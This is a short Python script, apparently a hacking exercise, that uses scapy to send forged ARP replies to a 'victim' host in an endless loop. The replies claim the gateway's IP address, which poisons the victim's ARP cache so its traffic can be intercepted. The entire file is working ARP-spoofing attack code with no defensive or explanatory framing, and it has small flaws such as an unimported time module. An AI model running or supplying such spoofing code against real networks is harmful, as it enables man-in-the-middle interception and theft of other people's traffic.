import socket
from whois import whois
from scapy.all import *
def main():
    gatewayIP = "192.168.82.2"
    victimIP = "192.168.82.156"
    hackMAC = "00:0c:29:f5:eb:46"
    victimMAC = "00:0c:29:08:17:1c"
    print(getmacbyip("192.168.82.170"))
    packet = Ether()/ARP(psrc=gatewayIP,pdst=victimIP)
    while 1:
        sendp(packet)
        time.sleep(2)
        print(packet.show())
    pass
if __name__ == '__main__':
    main()